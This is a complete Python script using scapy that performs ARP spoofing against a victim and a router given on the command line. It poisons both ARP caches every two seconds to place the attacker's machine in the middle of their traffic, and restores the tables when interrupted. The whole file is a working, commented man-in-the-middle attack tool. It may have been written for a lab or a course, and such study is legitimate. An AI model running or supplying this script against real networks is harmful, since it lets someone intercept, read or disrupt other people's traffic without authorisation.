from scapy.all import *
import sys
import time


def arp_spoof(dest_ip, dest_mac, source_ip):
    # Craft an ARP reply claiming "source_ip is at our MAC"
    # Ether(dst=dest_mac): send directly to the target's MAC on layer 2
    packet = Ether(dst=dest_mac) / ARP(
        op="is-at",  # ARP reply packet
        psrc=source_ip,  # the IP we pretend to be (router or victim)
        pdst=dest_ip,  # the IP of the target whose ARP cache we poison
        hwdst=dest_mac,  # the MAC of the target whose ARP cache we poison
    )
    sendp(packet, verbose=False)  # sendp(): send at layer 2


def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    # Restore the legitimate ARP entry by sending the correct MAC/IP mapping
    # hwsrc must be explicitly set to the real MAC of the device we impersonated
    packet = Ether(dst=dest_mac) / ARP(
        op="is-at", hwsrc=source_mac, hwdst=dest_mac, psrc=source_ip, pdst=dest_ip
    )
    sendp(packet, verbose=False)


def main():
    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]

    # Resolve MAC addresses via ARP requests
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)

    # If resolution fails, spoofing is impossible
    if victim_mac is None or router_mac is None:
        print("Could not resolve MAC addresses. Make sure the hosts are reachable.")
        exit(1)

    try:
        print("Sending spoofed ARP packets...")

        # Continuously poison both ARP caches (victim and router)
        while True:
            # Tell victim: router_ip → our MAC
            arp_spoof(victim_ip, victim_mac, router_ip)
            # Tell router: victim_ip → our MAC
            arp_spoof(router_ip, router_mac, victim_ip)
            time.sleep(2)  # Prevent flooding and keep entries fresh

    except KeyboardInterrupt:
        print("Restoring ARP tables...")

        # Send multiple restores because ARP caches may need reinforcement
        for _ in range(5):
            arp_restore(router_ip, router_mac, victim_ip, victim_mac)
            arp_restore(victim_ip, victim_mac, router_ip, router_mac)
            time.sleep(0.5)

        quit()


main()
